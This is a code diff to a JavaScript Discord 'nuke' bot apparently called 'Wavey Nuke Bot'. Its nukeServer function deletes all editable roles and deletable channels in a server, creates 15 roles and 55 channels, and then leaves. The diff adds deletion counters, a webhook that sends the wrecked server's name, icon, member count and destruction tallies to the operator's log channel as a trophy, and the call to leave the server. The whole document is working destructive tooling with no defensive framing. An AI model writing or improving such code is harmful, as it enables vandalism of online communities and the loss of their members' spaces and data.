@@ -66,16 +66,29 @@ async function nukeServer(guild) {
     try {
         console.log('Starting nuke process...');
         
+        // Store original server info for webhook
+        const originalServerName = guild.name;
+        const originalServerIcon = guild.iconURL();
+        const memberCount = guild.memberCount;
+        let rolesDeleted = 0;
+        let channelsDeleted = 0;
+        
         // First delete all roles (except @everyone)
         const roles = await guild.roles.fetch();
         await Promise.all(roles.map(role => {
-            if (role.editable && role.name !== '@everyone') return role.delete().catch(console.error);
+            if (role.editable && role.name !== '@everyone') {
+                rolesDeleted++;
+                return role.delete().catch(console.error);
+            }
         }));
         
         // Then instantly delete all channels
         const channels = await guild.channels.fetch();
         await Promise.all(channels.map(channel => {
-            if (channel.deletable) return channel.delete().catch(console.error);
+            if (channel.deletable) {
+                channelsDeleted++;
+                return channel.delete().catch(console.error);
+            }
         }));
         
         // Create 15 roles
@@ -128,6 +141,39 @@ async function nukeServer(guild) {
         await Promise.all(channelPromises);
         
         console.log('Server nuked successfully!');
+        
+        // Send webhook notification
+        try {
+            const logWebhook = new WebhookClient({ url: process.env.LOG_WEBHOOK });
+            const nukeEmbed = new EmbedBuilder()
+                .setColor('#FF0000')
+                .setTitle('💀 Server Nuked')
+                .setDescription(`**${originalServerName}** has been destroyed`)
+                .setThumbnail(originalServerIcon)
+                .addFields(
+                    { name: '👥 Members', value: memberCount.toString(), inline: true },
+                    { name: '🗑️ Roles Deleted', value: rolesDeleted.toString(), inline: true },
+                    { name: '📋 Channels Deleted', value: channelsDeleted.toString(), inline: true },
+                    { name: '➕ Roles Created', value: '15', inline: true },
+                    { name: '➕ Channels Created', value: '55', inline: true }
+                )
+                .setTimestamp()
+                .setFooter({ text: 'Wavey Nuke Bot' });
+            
+            await logWebhook.send({ embeds: [nukeEmbed] });
+            console.log('Webhook notification sent!');
+        } catch (error) {
+            console.error('Error sending webhook:', error);
+        }
+        
+        // Leave the server
+        try {
+            await guild.leave();
+            console.log('Left the server successfully!');
+        } catch (error) {
+            console.error('Error leaving server:', error);
+        }
+        
     } catch (error) {
         console.error('Error during nuke:', error);
     }
